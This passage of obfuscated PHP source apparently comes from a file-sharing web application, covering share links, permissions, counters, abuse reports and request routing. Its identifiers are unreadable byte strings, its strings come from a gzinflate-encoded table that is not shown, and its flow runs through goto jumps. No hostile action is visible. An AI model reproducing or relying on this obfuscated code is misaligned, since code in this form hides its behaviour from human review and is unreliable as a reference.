$this->getInfoByPath($Æò‰ùœ); $°³ïº”« = $ÚªßÙËß[2018]; if ($»ÈÛÉšÄ[$ÚªßÙËß[494]] == $ÚªßÙËß[197] && $˜”¯Ëµœ[$ÚªßÙËß[494]] == $ÚªßÙËß[88]) { $°³ïº”« = $ÚªßÙËß[2016]; } if ($»ÈÛÉšÄ[$ÚªßÙËß[494]] == $ÚªßÙËß[88] && $˜”¯Ëµœ[$ÚªßÙËß[494]] == $ÚªßÙËß[197]) { $°³ïº”« = $ÚªßÙËß[2019]; } if ($»ÈÛÉšÄ[$ÚªßÙËß[496]] == $ÚªßÙËß[197] && $˜”¯Ëµœ[$ÚªßÙËß[496]] == $ÚªßÙËß[88]) { $°³ïº”« = $ÚªßÙËß[2017]; } if ($»ÈÛÉšÄ[$ÚªßÙËß[496]] == $ÚªßÙËß[88] && $˜”¯Ëµœ[$ÚªßÙËß[496]] == $ÚªßÙËß[197]) { $°³ïº”« = $ÚªßÙËß[2020]; } Model($ÚªßÙËß[570])->eventShare($Æò‰ùœ, $°³ïº”«); return; } private function _addShareData($ÍÀ³¡ñŒ, $­¯¸¾ÆÍ = array(), $õÂ×… = false) { $âùÏûÖÂ =& $_SERVER[Ã¶¡¶„æ]; $ŞÛÊëŒº = $õÂ×… == $âùÏûÖÂ[1299] ? 0 : USER_ID; $‡øü¦Üè = array($âùÏûÖÂ[417] => $ÍÀ³¡ñŒ, $âùÏûÖÂ[1667] => $ŞÛÊëŒº); if ($ÍÀ³¡ñŒ == 0) { $‡øü¦Üè = array($âùÏûÖÂ[2021] => $­¯¸¾ÆÍ[$âùÏûÖÂ[1190]], $âùÏûÖÂ[1667] => $ŞÛÊëŒº); } if ($¨÷ãàÑ = $this->where($‡øü¦Üè)->find()) { return $¨÷ãàÑ[$âùÏûÖÂ[489]]; } if ($ÍÀ³¡ñŒ == 0) { $‰¾Êú±å = array($âùÏûÖÂ[32] => get_path_this($­¯¸¾ÆÍ[$âùÏûÖÂ[84]])); } else { $‰¾Êú±å = Model($âùÏûÖÂ[831])->sourceInfo($ÍÀ³¡ñŒ); if (!$‰¾Êú±å) { return !1; } } if (!$­¯¸¾ÆÍ[$âùÏûÖÂ[1576]]) { $­¯¸¾ÆÍ[$âùÏûÖÂ[1576]] = $‰¾Êú±å[$âùÏûÖÂ[32]]; } $¡Ä÷éşİ = array($âùÏûÖÂ[1667] => $ŞÛÊëŒº, $âùÏûÖÂ[417] => $ÍÀ³¡ñŒ, $âùÏûÖÂ[1576] => $âùÏûÖÂ[12], $âùÏûÖÂ[494] => 0, $âùÏûÖÂ[496] => 0, $âùÏûÖÂ[1190] => $âùÏûÖÂ[12], $âùÏûÖÂ[307] => $âùÏûÖÂ[12], $âùÏûÖÂ[903] => $âùÏûÖÂ[12], $âùÏûÖÂ[2022] => 0, $âùÏûÖÂ[2023] => 0, $âùÏûÖÂ[497] => 0, $âùÏûÖÂ[498] => $âùÏûÖÂ[12], $âùÏûÖÂ[491] => $âùÏûÖÂ[12]); $ËõüşÀÊ = explode($âùÏûÖÂ[50], $âùÏûÖÂ[2024]); foreach ($ËõüşÀÊ as $°³Ş€äì) { if (!isset($­¯¸¾ÆÍ[$°³Ş€äì])) { continue; } $¡Ä÷éşİ[$°³Ş€äì] = $­¯¸¾ÆÍ[$°³Ş€äì]; } $İ×É™í = $this->add($¡Ä÷éşİ); $ßù†¢“¬ = array($âùÏûÖÂ[491] => short_id($İ×É™í)); $this->where(array($âùÏûÖÂ[488] => $İ×É™í))->save($ßù†¢“¬); return $İ×É™í; } private function _shareAuthSet($ÚœÃ¦˜¡, $­º¯± …) { $¬è—ë¬‡ =& $_SERVER[Ã¶¡¶„æ]; if (!is_array($­º¯± …)) { return !1; } $êÉ¡è¾ = Model($¬è—ë¬‡[1973]); $êÉ¡è¾->where(array($¬è—ë¬‡[489] => $ÚœÃ¦˜¡))->delete(); $ «»šÚ¶ = array(); foreach ($­º¯± … as $æÇçãÎå) { $©‡ÓŸ”Ï = SourceModel::TYPE_USER; if ($æÇçãÎå[$¬è—ë¬‡[411]] == SourceModel::TYPE_GROUP) { $©‡ÓŸ”Ï = SourceModel::TYPE_GROUP; } $ôÊÙø•ˆ = array($¬è—ë¬‡[489] => $ÚœÃ¦˜¡, $¬è—ë¬‡[411] => $©‡ÓŸ”Ï, $¬è—ë¬‡[505] => intval($æÇçãÎå[$¬è—ë¬‡[505]]), $¬è—ë¬‡[1969] => 0, $¬è—ë¬‡[2025] => -1); if ($æÇçãÎå[$¬è—ë¬‡[1969]]) { $ôÊÙø•ˆ[$¬è—ë¬‡[1969]] = $æÇçãÎå[$¬è—ë¬‡[1969]]; } else { if ($æÇçãÎå[$¬è—ë¬‡[2025]]) { $ôÊÙø•ˆ[$¬è—ë¬‡[2025]] = $æÇçãÎå[$¬è—ë¬‡[2025]]; } } $ «»šÚ¶[] = $ôÊÙø•ˆ; } return $êÉ¡è¾->addAll($ «»šÚ¶, array(), !0); } public function numViewAdd($‚ƒå”©á) { $ÖØåÏ¾¿ =& $_SERVER[Ã¶¡¶„æ]; $€Å˜Ó… = array($ÖØåÏ¾¿[488] => $‚ƒå”©á); $this->where($€Å˜Ó…)->setAdd($ÖØåÏ¾¿[2022]); } public function numDownloadAdd($‡ŠÊÏÓŸ) { $ŒİÁ€†Œ =& $_SERVER[Ã¶¡¶„æ]; $¯‡úò–Ş = array($ŒİÁ€†Œ[488] => $‡ŠÊÏÓŸ); $this->where($¯‡úò–Ş)->setAdd($ŒİÁ€†Œ[2023]); } protected function shareEdit($ø®Ì…Ï¿, $áÉç´äş) { $­·ÂÉï¾ =& $_SERVER[Ã¶¡¶„æ]; $éÈöÎÔŞ = $this->getInfo($ø®Ì…Ï¿); if (!$éÈöÎÔŞ) { return !1; } $this->_checkLinkShare($áÉç´äş, $éÈöÎÔŞ); $ş­ëª¬Š = array(); $òàØŞô° = explode($­·ÂÉï¾[50], $­·ÂÉï¾[2026]); foreach ($òàØŞô° as $•Úƒ£©ô) { if (!array_key_exists($•Úƒ£©ô, $áÉç´äş)) { continue; } $ş­ëª¬Š[$•Úƒ£©ô] = $áÉç´äş[$•Úƒ£©ô]; } $this->shareEventAdd($éÈöÎÔŞ[$­·ÂÉï¾[402]], $áÉç´äş, $­·ÂÉï¾[1835]); $this->where(array($­·ÂÉï¾[488] => $ø®Ì…Ï¿))->save($ş­ëª¬Š); if (isset($áÉç´äş[$­·ÂÉï¾[2015]])) { $this->_shareAuthSet($ø®Ì…Ï¿, $áÉç´äş[$­·ÂÉï¾[2015]]); } return !0; } private function _checkLinkShare($¦«ÑÊÜ½, $ÏÛúÊ¿Ã) { $ìùÆÔ±‘ =& $_SERVER[Ã¶¡¶„æ]; if ($¦«ÑÊÜ½[$ìùÆÔ±‘[494]] != $ìùÆÔ±‘[88]) { return; } $Á­â–çÇ = $ÏÛúÊ¿Ã[$ìùÆÔ±‘[86]][$ìùÆÔ±‘[402]]; if ($ÏÛúÊ¿Ã[$ìùÆÔ±‘[86]][$ìùÆÔ±‘[33]] != $ìùÆÔ±‘[199]) { $Ó®ëí”ø = $this->_folderReport($Á­â–çÇ); if (!$Ó®ëí”ø) { return; } show_json(LNG($ìùÆÔ±‘[2027]) . $ìùÆÔ±‘[2028] . $Ó®ëí”ø, !1); } $”éÜ¼ûº = Model($ìùÆÔ±‘[831])->fileInfoGet($ÏÛúÊ¿Ã[$ìùÆÔ±‘[86]][$ìùÆÔ±‘[402]]); if (!$”éÜ¼ûº) { return; } $ıÈÄëÍş = $this->shareFileMeta($”éÜ¼ûº[$ìùÆÔ±‘[468]]); if (isset($ıÈÄëÍş[$ìùÆÔ±‘[374]]) && $ıÈÄëÍş[$ìùÆÔ±‘[374]] == $ìùÆÔ±‘[88]) { show_json(LNG($ìùÆÔ±‘[2029]), !1); } } private function _folderReport($Ìæ¼©Ù†) { $·×Şçš =& $_SERVER[Ã¶¡¶„æ]; $àòÌÌñ± = array($·×Şçš[468] => array($·×Şçš[1026], 0), $·×Şçš[756] => 3); $•¥«º‹ğ = Model($·×Şçš[2030])->where($àòÌÌñ±)->field($·×Şçš[468])->select(); if (!$•¥«º‹ğ) { return !1; } $•¥«º‹ğ = array_to_keyvalue($•¥«º‹ğ, $·×Şçš[12], $·×Şçš[468]); $Ö¤î¯Û = $·×Şçš[50] . $Ìæ¼©Ù† . $·×Şçš[50]; $àòÌÌñ± = array($·×Şçš[468] => array($·×Şçš[7], $•¥«º‹ğ), $·×Şçš[521] => array($·×Şçš[383], "\x25{$Ö¤î¯Û}\x25"), $·×Şçš[431] => 0); $â£©ˆ½ = Model($·×Şçš[831])->where($àòÌÌñ±)->field($·×Şçš[2031])->find(); if (!$â£©ˆ½) { return !1; } $ÄÑİ˜÷ = substr($â£©ˆ½[$·×Şçš[521]], strpos($â£©ˆ½[$·×Şçš[521]], $Ö¤î¯Û)); $àòÌÌñ± = array($·×Şçš[402] => array($·×Şçš[7], trim($ÄÑİ˜÷, $·×Şçš[50]))); $½˜¦Ä®¿ = Model($·×Şçš[831])->where($àòÌÌñ±)->field($·×Şçš[32])->select(); $÷‰÷¬»ı = array_to_keyvalue($½˜¦Ä®¿, $·×Şçš[12], $·×Şçš[32]); $÷‰÷¬»ı[] = $â£©ˆ½[$·×Şçš[32]]; return implode($·×Şçš[8], $÷‰÷¬»ı); } protected function remove($Â‹†Æ¥³) { $öşéàİ =& $_SERVER[Ã¶¡¶„æ]; if (is_array($Â‹†Æ¥³)) { $Â‹†Æ¥³ = array($öşéàİ[7], $Â‹†Æ¥³); } $ñİ…ƒµ = array($öşéàİ[489] => $Â‹†Æ¥³); $Ğ“‚©Ü = $this->where($ñİ…ƒµ)->delete(); if ($Ğ“‚©Ü) { Model($öşéàİ[602])->where(array($öşéàİ[489] => $Â‹†Æ¥³))->delete(); } $¯º‡äã = is_array($Â‹†Æ¥³) ? $Â‹†Æ¥³[1] : array($Â‹†Æ¥³); for ($ìŸÒó–ë = 0; $ìŸÒó–ë < count($¯º‡äã); $ìŸÒó–ë++) { $¾ÌñÉÎÑ = $this->getInfo($¯º‡äã[$ìŸÒó–ë]); if ($¾ÌñÉÎÑ[$öşéàİ[496]] == $öşéàİ[88]) { Model($öşéàİ[570])->eventShare($¾ÌñÉÎÑ[$öşéàİ[402]], $öşéàİ[2020]); } if ($¾ÌñÉÎÑ[$öşéàİ[494]] == $öşéàİ[88]) { Model($öşéàİ[570])->eventShare($¾ÌñÉÎÑ[$öşéàİ[402]], $öşéàİ[2019]); } } return $Ğ“‚©Ü; } protected function removeBySource($şò˜Èãí) { $”ûÔ¨÷Ñ =& $_SERVER[Ã¶¡¶„æ]; $¿“˜å×ó = array($”ûÔ¨÷Ñ[417] => array($”ûÔ¨÷Ñ[418], $şò˜Èãí)); $÷Á®Ğ¸ˆ = $this->field($”ûÔ¨÷Ñ[489])->where($¿“˜å×ó)->select(); $÷Á®Ğ¸ˆ = array_to_keyvalue($÷Á®Ğ¸ˆ, $”ûÔ¨÷Ñ[12], $”ûÔ¨÷Ñ[489]); if (!$÷Á®Ğ¸ˆ) { return; } $¿“˜å×ó = array($”ûÔ¨÷Ñ[488] => array($”ûÔ¨÷Ñ[418], $÷Á®Ğ¸ˆ)); $this->where($¿“˜å×ó)->delete(); Model($”ûÔ¨÷Ñ[602])->where($¿“˜å×ó)->delete(); } public function listAll($ø…ÕëìŠ) { $Ë–ô¸Ÿ¢ =& $_SERVER[Ã¶¡¶„æ]; $»…­ğ¦Ç = array(); if ($ø…ÕëìŠ[$Ë–ô¸Ÿ¢[1676]]) { $»…­ğ¦Ç[$Ë–ô¸Ÿ¢[1676]] = $ø…ÕëìŠ[$Ë–ô¸Ÿ¢[1676]]; } if ($ø…ÕëìŠ[$Ë–ô¸Ÿ¢[767]]) { $¶ëƒë®‡ = $ø…ÕëìŠ[$Ë–ô¸Ÿ¢[497]] ? $ø…ÕëìŠ[$Ë–ô¸Ÿ¢[497]] : strtotime(date($Ë–ô¸Ÿ¢[2032])); $»…­ğ¦Ç[$Ë–ô¸Ÿ¢[200]] = array($Ë–ô¸Ÿ¢[333], array($ø…ÕëìŠ[$Ë–ô¸Ÿ¢[767]], $¶ëƒë®‡)); } if ($ø…ÕëìŠ[$Ë–ô¸Ÿ¢[33]]) { $»…­ğ¦Ç[$ø…ÕëìŠ[$Ë–ô¸Ÿ¢[33]]] = 1; } else { $»…­ğ¦Ç[] = array($Ë–ô¸Ÿ¢[494] => array($Ë–ô¸Ÿ¢[1026], 0), $Ë–ô¸Ÿ¢[496] => array($Ë–ô¸Ÿ¢[1026], 0), $Ë–ô¸Ÿ¢[2009] => $Ë–ô¸Ÿ¢[1963]); } if ($ø…ÕëìŠ[$Ë–ô¸Ÿ¢[1959]]) { $»…­ğ¦Ç[] = array($Ë–ô¸Ÿ¢[491] => $ø…ÕëìŠ[$Ë–ô¸Ÿ¢[1959]], $Ë–ô¸Ÿ¢[1576] => array($Ë–ô¸Ÿ¢[383], "\x25{$ø…ÕëìŠ[$Ë–ô¸Ÿ¢[1959]]}\45"), $Ë–ô¸Ÿ¢[2009] => $Ë–ô¸Ÿ¢[1963]); } $şµÃªÉİ = $this->_makeOrder()->where($»…­ğ¦Ç)->selectPage(20); if (empty($şµÃªÉİ[$Ë–ô¸Ÿ¢[369]])) { return array(); } $this->_listDataApply($şµÃªÉİ[$Ë–ô¸Ÿ¢[369]]); return $şµÃªÉİ; } public function listDataApply($ø¼ô»Û) { $this->_listDataApply($ø¼ô»Û); return $ø¼ô»Û; } private function _listDataApply(&$ë„çĞ‡”) { $èø¡§ =& $_SERVER[Ã¶¡¶„æ]; $â¹Ä¡´¤ = array_to_keyvalue($ë„çĞ‡”, $èø¡§[12], $èø¡§[1676]); $ÓÇ¦Ëò³ = Model($èø¡§[535])->userListInfo(array_unique($â¹Ä¡´¤)); $õ´Íä¨µ = array_to_keyvalue($ë„çĞ‡”, $èø¡§[12], $èø¡§[402]); $–ó¸´÷• = Model($èø¡§[831])->sourceListInfo($õ´Íä¨µ, !0); foreach ($ë„çĞ‡” as $Ÿ­ÄãÄÔ => &$ª¦“¿—¸) { $¼©ì÷” = $ª¦“¿—¸[$èø¡§[1676]]; $ª¦“¿—¸[$èø¡§[2033]] = $ÓÇ¦Ëò³[$¼©ì÷”] ? $ÓÇ¦Ëò³[$¼©ì÷”] : !1; $À¦ßàæ» = $ª¦“¿—¸[$èø¡§[402]]; $ª¦“¿—¸[$èø¡§[86]] = $–ó¸´÷•[$À¦ßàæ»] ? $–ó¸´÷•[$À¦ßàæ»] : !1; if ($ª¦“¿—¸[$èø¡§[86]][$èø¡§[431]] == $èø¡§[88]) { unset($ë„çĞ‡”[$Ÿ­ÄãÄÔ]); } if ($ª¦“¿—¸[$èø¡§[86]] != $èø¡§[197] && !$ª¦“¿—¸[$èø¡§[86]]) { unset($ë„çĞ‡”[$Ÿ­ÄãÄÔ]); } } unset($ª¦“¿—¸); $ë„çĞ‡” = array_values($ë„çĞ‡”); } private function _makeOrder($¹¾”ùı = '') { $ıİ¿¾¡Ø =& $_SERVER[Ã¶¡¶„æ]; $²Ì½é³Î = array($ıİ¿¾¡Ø[200], $ıİ¿¾¡Ø[497], $ıİ¿¾¡Ø[2022], $ıİ¿¾¡Ø[2023]); $ñˆÆ§Ñâ = array($ıİ¿¾¡Ø[450] => $ıİ¿¾¡Ø[451], $ıİ¿¾¡Ø[452] => $ıİ¿¾¡Ø[453]); $˜ÑŞÉó“ = Input::get($ıİ¿¾¡Ø[457], $ıİ¿¾¡Ø[7], $ıİ¿¾¡Ø[423], $²Ì½é³Î); $š›ºÕñÙ = Input::get($ıİ¿¾¡Ø[458], $ıİ¿¾¡Ø[7], $ıİ¿¾¡Ø[2034], array($ıİ¿¾¡Ø[1956], $ıİ¿¾¡Ø[452])); $š›ºÕñÙ = $ñˆÆ§Ñâ[$š›ºÕñÙ]; $¹¾”ùı = $¹¾”ùı . "{$˜ÑŞÉó“}\40{$š›ºÕñÙ}"; return $this->order($¹¾”ùı); } public function reportAdd($¯¶µòê) { $ãÎÛ‘Ø =& $_SERVER[Ã¶¡¶„æ]; $’©¯é¦ü = array($ãÎÛ‘Ø[489] => $¯¶µòê[$ãÎÛ‘Ø[489]], $ãÎÛ‘Ø[1676] => USER_ID); if (Model($ãÎÛ‘Ø[2030])->where($’©¯é¦ü)->find()) { return !1; } $’ëÜÚ = array($ãÎÛ‘Ø[489] => $¯¶µòê[$ãÎÛ‘Ø[489]], $ãÎÛ‘Ø[1576] => $¯¶µòê[$ãÎÛ‘Ø[1576]], $ãÎÛ‘Ø[402] => $¯¶µòê[$ãÎÛ‘Ø[402]], $ãÎÛ‘Ø[468] => $¯¶µòê[$ãÎÛ‘Ø[468]], $ãÎÛ‘Ø[1676] => USER_ID, $ãÎÛ‘Ø[33] => $¯¶µòê[$ãÎÛ‘Ø[33]], $ãÎÛ‘Ø[453] => $¯¶µòê[$ãÎÛ‘Ø[453]]); return Model($ãÎÛ‘Ø[2030])->add($’ëÜÚ); } public function reportList($‘«àíé™) { $½¾İ¦æ =& $_SERVER[Ã¶¡¶„æ]; $§ÄœçèÜ = array(); if ($‘«àíé™[$½¾İ¦æ[767]]) { $Éò¾Í­’ = $‘«àíé™[$½¾İ¦æ[497]] ? $‘«àíé™[$½¾İ¦æ[497]] : strtotime(date($½¾İ¦æ[2032])); $§ÄœçèÜ[$½¾İ¦æ[200]] = array($½¾İ¦æ[333], array($‘«àíé™[$½¾İ¦æ[767]], $Éò¾Í­’)); } if (isset($‘«àíé™[$½¾İ¦æ[33]]) && in_array($‘«àíé™[$½¾İ¦æ[33]], array($½¾İ¦æ[88], $½¾İ¦æ[437], $½¾İ¦æ[2035], $½¾İ¦æ[2036], $½¾İ¦æ[2037]))) { $§ÄœçèÜ[$½¾İ¦æ[33]] = $‘«àíé™[$½¾İ¦æ[33]]; } if (isset($‘«àíé™[$½¾İ¦æ[756]]) && in_array($‘«àíé™[$½¾İ¦æ[756]], array($½¾İ¦æ[197], $½¾İ¦æ[88], $½¾İ¦æ[437], $½¾İ¦æ[2035]))) { $§ÄœçèÜ[$½¾İ¦æ[756]] = $‘«àíé™[$½¾İ¦æ[756]]; } $ºˆºØµŠ = Input::get($½¾İ¦æ[458], $½¾İ¦æ[7], $½¾İ¦æ[2034], array($½¾İ¦æ[1956], $½¾İ¦æ[452])); $‰ãâß = array($½¾İ¦æ[450] => $½¾İ¦æ[451], $½¾İ¦æ[452] => $½¾İ¦æ[453]); $¦ıÏ‡¡ø = $½¾İ¦æ[2038] . $‰ãâß[$ºˆºØµŠ]; $ÈşáÓ¹Ê = Model($½¾İ¦æ[2030])->where($§ÄœçèÜ)->order($¦ıÏ‡¡ø)->selectPage(20); if (empty($ÈşáÓ¹Ê[$½¾İ¦æ[369]])) { return array(); } $¹·…¿¯´ = array_to_keyvalue_group($ÈşáÓ¹Ê[$½¾İ¦æ[369]], $½¾İ¦æ[756], $½¾İ¦æ[489]); if (!empty($¹·…¿¯´[0])) { $‘«àíé™ = $¹·…¿¯´[0]; $§ÄœçèÜ = array($½¾İ¦æ[489] => array($½¾İ¦æ[7], $‘«àíé™)); $§áòùÄô = $this->where($§ÄœçèÜ)->field($½¾İ¦æ[489])->select(); $§áòùÄô = array_to_keyvalue($§áòùÄô, $½¾İ¦æ[12], $½¾İ¦æ[489]); $âş¶Äô‚ = array_diff($‘«àíé™, $§áòùÄô); if (!empty($âş¶Äô‚)) { foreach ($ÈşáÓ¹Ê[$½¾İ¦æ[369]] as $ÖÆµ®‚  => $êŒË¾¨ª) { if (in_array($êŒË¾¨ª[$½¾İ¦æ[489]], $âş¶Äô‚)) { unset($ÈşáÓ¹Ê[$½¾İ¦æ[369]][$ÖÆµ®‚ ]); } } } } $this->_listDataApply($ÈşáÓ¹Ê[$½¾İ¦æ[369]]); return $ÈşáÓ¹Ê; } public function reportStatus($›â½Æ”ó) { $°€ÀÃ™ =& $_SERVER[Ã¶¡¶„æ]; $î±Î×Ü¿ = array($°€ÀÃ™[399] => $›â½Æ”ó[$°€ÀÃ™[399]]); $¡À÷ÖÚ· = Model($°€ÀÃ™[2030])->where($î±Î×Ü¿)->field($°€ÀÃ™[2039])->find(); if (!$¡À÷ÖÚ·) { return !1; } $ôÄË‚ç = array($°€ÀÃ™[756] => $›â½Æ”ó[$°€ÀÃ™[756]]); if ($›â½Æ”ó[$°€ÀÃ™[756]] == $°€ÀÃ™[2035] && $¡À÷ÖÚ·[$°€ÀÃ™[756]] == $°€ÀÃ™[2035]) { $ôÄË‚ç[$°€ÀÃ™[756]] = 0; } $¬Èé¢’¥ = Model($°€ÀÃ™[2030])->where($î±Î×Ü¿)->save($ôÄË‚ç); if ($›â½Æ”ó[$°€ÀÃ™[756]] == $°€ÀÃ™[437]) { if ($¡À÷ÖÚ·[$°€ÀÃ™[468]] != $°€ÀÃ™[197] && $this->shareFileMeta($¡À÷ÖÚ·[$°€ÀÃ™[468]])) { $this->shareFileMeta($¡À÷ÖÚ·[$°€ÀÃ™[468]], 0); } $this->remove($¡À÷ÖÚ·[$°€ÀÃ™[489]]); return !0; } if ($¬Èé¢’¥ && $›â½Æ”ó[$°€ÀÃ™[756]] == $°€ÀÃ™[2035]) { $ÊÂ¢Œ°á = $ôÄË‚ç[$°€ÀÃ™[756]] == $°€ÀÃ™[2035] ? 1 : 0; $this->shareFileMeta($¡À÷ÖÚ·[$°€ÀÃ™[468]], $ÊÂ¢Œ°á); $this->removeByFile($¡À÷ÖÚ·[$°€ÀÃ™[468]]); } return $¬Èé¢’¥; } private function removeByFile($È´œÁß) { $Ç¸€ıÓ¥ =& $_SERVER[Ã¶¡¶„æ]; $Á®ÓØ¶ = Model($Ç¸€ıÓ¥[831])->where(array($Ç¸€ıÓ¥[468] => $È´œÁß))->field($Ç¸€ıÓ¥[402])->select(); $±ç‘Ï’ı = array_to_keyvalue($Á®ÓØ¶, $Ç¸€ıÓ¥[12], $Ç¸€ıÓ¥[402]); $ôä”ƒ¤ = array($Ç¸€ıÓ¥[402] => array($Ç¸€ıÓ¥[7], $±ç‘Ï’ı), $Ç¸€ıÓ¥[494] => 1); $Á®ÓØ¶ = $this->where($ôä”ƒ¤)->field($Ç¸€ıÓ¥[489])->select(); if (empty($Á®ÓØ¶)) { return; } $É°ïÖÇŸ = array_to_keyvalue($Á®ÓØ¶, $Ç¸€ıÓ¥[12], $Ç¸€ıÓ¥[489]); $this->remove($É°ïÖÇŸ); } private function shareFileMeta($¡Ü‚Å¡ò, $¦´ïÑ¦Ï = null) { $É›„şÃı =& $_SERVER[Ã¶¡¶„æ]; $ĞÉ¢ŸÓ = array($É›„şÃı[468] => $¡Ü‚Å¡ò, $É›„şÃı[94] => $É›„şÃı[2040]); if (is_null($¦´ïÑ¦Ï)) { return Model($É›„şÃı[2041])->where($ĞÉ¢ŸÓ)->find(); } $ĞÉ¢ŸÓ[$É›„şÃı[374]] = $¦´ïÑ¦Ï; Model($É›„şÃı[2041])->add($ĞÉ¢ŸÓ, array(), !0); } } goto e¢‹›§œ›´; Bš…ÑæÍŒË: define($_SERVER[Ã¶¡¶„æ][0], $_SERVER[Ã¶¡¶„æ][1]); $_SERVER[Û®İªÒ] = explode($_SERVER[Ã¶¡¶„æ][2], gzinflate(substr($_SERVER[Ã¶¡¶„æ][3], 10, -8))); function binCheckEq($Îõß›ñ, $ßÓÌôÔò) { return $Îõß›ñ == $ßÓÌôÔò; } goto DØÌĞšô¨; EìéÄ¯§Îƒ: class Application { private $defaultModule = "\x69\x6e\144\145\170"; private $defaultController = "\x69\156\x64\145\170"; private $defaultAction = "\x69\156\144\145\x78"; function __construct() { } public function setDefault($­ºä«µÌ) { $ŸŠ³Å”¾ =& $_SERVER[Ã¶¡¶„æ]; $Õ¥¢½ä³ =& $_SERVER[è¿ÅÂ¤¥]; $ïŒ³¶Öë = explode($Õ¥¢½ä³[0], trim($­ºä«µÌ, $Õ¥¢½ä³[0])); $this->defaultModule = $ïŒ³¶Öë[0] ? $ïŒ³¶Öë[0] : $this->defaultModule; $this->defaultController = $ïŒ³¶Öë[1] ? $ïŒ³¶Öë[1] : $this->defaultController; $Ó†±”£Á = $ŸŠ³Å”¾[620]; if (!$Ó†±”£Á) { return; } $this->defaultAction = $ïŒ³¶Öë[2] ? $ïŒ³¶Öë[2] : $this->defaultAction; $this->wcaqa624b2a8($Õ¥¢½ä³[1], array($this, $Õ¥¢½ä³[2])); $Ñ°‹Ç­ş = $ŸŠ³Å”¾[621]; if (strlen($Ñ°‹Ç­ş) < $ŸŠ³Å”¾[615]) { return; } } public function appRun($Ìä…éÇŞ) { $¨óôâô‚ =& $_SERVER[è¿ÅÂ¤¥]; $²í­Ö³¦ = explode($¨óôâô‚[0], $Ìä…éÇŞ); $•İñ¨İ = strtolower($²í­Ö³¦[0]); $ƒÇ‰¸ŒŒ = $¨óôâô‚[3]; if ($•İñ¨İ == $¨óôâô‚[4]) { $ƒÇ‰¸ŒŒ = $¨óôâô‚[5]; $²í­Ö³¦[0] = $¨óôâô‚[6]; $²í­Ö³¦[1] = $²í­Ö³¦[1] . $¨óôâô‚[7]; $Ìä…éÇŞ = join($¨óôâô‚[0], $²í­Ö³¦); $Ìä…éÇŞ = trim($Ìä…éÇŞ, $¨óôâô‚[0]); } call_user_func(array($¨óôâô‚[8], $¨óôâô‚[9]), $ƒÇ‰¸ŒŒ . $¨óôâô‚[10], $Ìä…éÇŞ); ActionCall($Ìä…éÇŞ); call_user_func(array($¨óôâô‚[8], $¨óôâô‚[9]), $ƒÇ‰¸ŒŒ . $¨óôâô‚[11], $Ìä…éÇŞ); } private function autorun() { $ºèƒÛÉù =& $_SERVER[Ã¶¡¶„æ]; $óßûú°‘ =& $_SERVER[è¿ÅÂ¤¥]; global $config; $¬Ğé¶“Ã = $ºèƒÛÉù[622]; if (count($config[$óßûú°‘[12]]) == 0) { return; } foreach ($config[$óßûú°‘[12]] as $ÊÃ¶Ê => $¨öŠ¿ü‹) { $this->appRun($¨öŠ¿ü‹); $‹¡ì‹ØŠ = $ºèƒÛÉù[623]; if (strlen($‹¡ì‹ØŠ) < $ºèƒÛÉù[624]) { return; } } } private function fjuv99c90150() { $ŒŞÀ£ú¼ =& $_SERVER[è¿ÅÂ¤¥]; $šíş—áŒ = $ŒŞÀ£ú¼[4]; $„¤ñ®º“ = $GLOBALS[$ŒŞÀ£ú¼[13]][$ŒŞÀ£ú¼[14]][0]; if (!$„¤ñ®º“ || strlen($„¤ñ®º“) <= strlen($šíş—áŒ)) { return; } if (strtolower(substr($„¤ñ®º“, -strlen($šíş—áŒ))) != $šíş—áŒ) { return; } $“Ò€Ìåõ = substr($„¤ñ®º“, 0, -strlen($šíş—áŒ)); $ï’·× = array($ŒŞÀ£ú¼[4], $“Ò€Ìåõ); $ÁŠİ·¸Ñ = array_slice($GLOBALS[$ŒŞÀ£ú¼[13]][$ŒŞÀ£ú¼[14]], 1); $GLOBALS[$ŒŞÀ£ú¼[13]][$ŒŞÀ£ú¼[14]] = array_merge($ï’·×, $ÁŠİ·¸Ñ); $GLOBALS[$ŒŞÀ£ú¼[13]][$ŒŞÀ£ú¼[15]] = implode($ŒŞÀ£ú¼[0], $GLOBALS[$ŒŞÀ£ú¼[13]][$ŒŞÀ£ú¼[14]]); $ÓÄ‘í’ = $_SERVER[Ã¶¡¶„æ][625]; } private function ucorcb79ad42() { $¦ĞõÀÕş =& $_SERVER[Ã¶¡¶„æ]; $áµ™Ô¼ =& $_SERVER[è¿ÅÂ¤¥]; if ($GLOBALS[$áµ™Ô¼[13]][$áµ™Ô¼[15]] != $áµ™Ô¼[6]) { return; } $¤éÇ± = $_SERVER[$áµ™Ô¼[16]]; $Õ´åâ› = $áµ™Ô¼[17]; if (!strstr($¤éÇ±, $Õ´åâ›)) { return; } $Şšêº³‡ = strrpos($¤éÇ±, $Õ´åâ›); $™®Ë¹Ô™ = $¦ĞõÀÕş[626]; if (strlen($™®Ë¹Ô™) < $¦ĞõÀÕş[615]) { die; } $ÛºÎ÷©Ï = substr($¤éÇ±, $Şšêº³‡ + strlen($Õ´åâ›)); $Õµİ™á = $¦ĞõÀÕş[627]; preg_match_all($áµ™Ô¼[18], $ÛºÎ÷©Ï, $¦íô¥§á); $ÇÛÍÍ‘ = $¦ĞõÀÕş[628]; $ÛºÎ÷©Ï = trim($¦íô¥§á[0][0], $áµ™Ô¼[19]); $GLOBALS[$áµ™Ô¼[13]][$áµ™Ô¼[14]] = explode($áµ™Ô¼[19], $ÛºÎ÷©Ï); $³´ïÀ÷ = $¦ĞõÀÕş[629]; while ($³´ïÀ÷ < $¦ĞõÀÕş[630]) { if ($³´ïÀ÷ >= 0) { break; } $³´ïÀ÷++; } $GLOBALS[$áµ™Ô¼[13]][$áµ™Ô¼[15]] = implode($áµ™Ô¼[0], $GLOBALS[$áµ™Ô¼[13]][$áµ™Ô¼[14]]); $ ûÉóşÏ = $¦ĞõÀÕş[631]; } public function run() { $ğ¬’çµÛ =& $_SERVER[Ã¶¡¶„æ]; $Š­”®Ç¦ =& $_SERVER[è¿ÅÂ¤¥]; $this->ucorcb79ad42(); $this->fjuv99c90150(); $ÉÖá•àº = $GLOBALS[$Š­”®Ç¦[13]][$Š­”®Ç¦[14]]; $è×Ï®¯‹ = $ğ¬’çµÛ[632]; if (!$è×Ï®¯‹) { return; } $şÆüˆã = $GLOBALS[$Š­”®Ç¦[13]][$Š­”®Ç¦[15]]; $š†ôÕßš = $ğ¬’çµÛ[633]; if (!$š†ôÕßš) { return; } define($Š­”®Ç¦[20], isset($ÉÖá•àº[0]) && $ÉÖá•àº[0] ? $ÉÖá•àº[0] : $this->defaultModule); $œïÇ¬Âï = $ğ¬’çµÛ[634]; if 